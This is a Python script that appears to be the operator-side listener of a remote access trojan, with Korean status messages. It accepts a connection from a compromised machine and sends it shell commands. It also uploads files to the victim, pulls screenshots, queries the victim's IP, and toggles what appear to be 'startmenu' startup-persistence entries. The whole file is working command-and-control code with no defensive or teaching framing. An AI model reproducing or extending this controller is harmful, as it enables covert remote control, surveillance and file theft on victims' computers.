import socket
import os
import time

HOST = '192.168.35.185'
PORT = 29584
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((HOST,PORT))
s.listen(1)
conn, addr=s.accept()
print("커넥트")
print(addr)
while True:
    getcwd = conn.recv(2048)
    getcwd = getcwd.decode('utf-8')
    print("\n\ncomplete\n\n")
    a = input("\n"+getcwd+">>")
    conn.sendall(a.encode('utf-8'))
    if "upload" in a:
        path = a.split(' ')
        name = path[1]
        print(name)
        f = open(name,'rb')
        l = f.read(2048)
        while(l):
            print("데이터 전송중")
            conn.send(l)
            l = f.read(2048)
        f.close()

        time.sleep(2)
        conn.sendall("end".encode('utf-8'))
        st = conn.recv(2048).decode('utf-8')
        print("\n\n총 : %sKB\n\n"%st)

    elif "screenshot" in a:
        f = open('screenshot.jpg','wb')
        count = 0
        while True:
            l = conn.recv(2048)
            try:
                l = l.decode('utf-8')
            except UnicodeDecodeError:
                count +=1
                f.write(l)
                print("데이터 받는중")
            if l == "end":
                break
        f.close()
        print(f"총 : {count/2}Byte 이하")

    elif a==' ' or a=='':
        conn.sendall(' '.encode('utf-8'))

    elif 'startmenu add' in a:
        time.sleep(2)
    
    
    elif 'startmenu del' in a:
        time.sleep(2)


    elif "ip"==a:
        data = conn.recv(2048)
        data = data.decode('utf-8')
        print(data)

    else:
        data = conn.recv(2048)
        data = data.decode('utf-8')
        if not '배치 파일이' in data:
            data = data.replace("'",'')
        if data != "a":
            print(data)
    time.sleep(1)
conn.close()
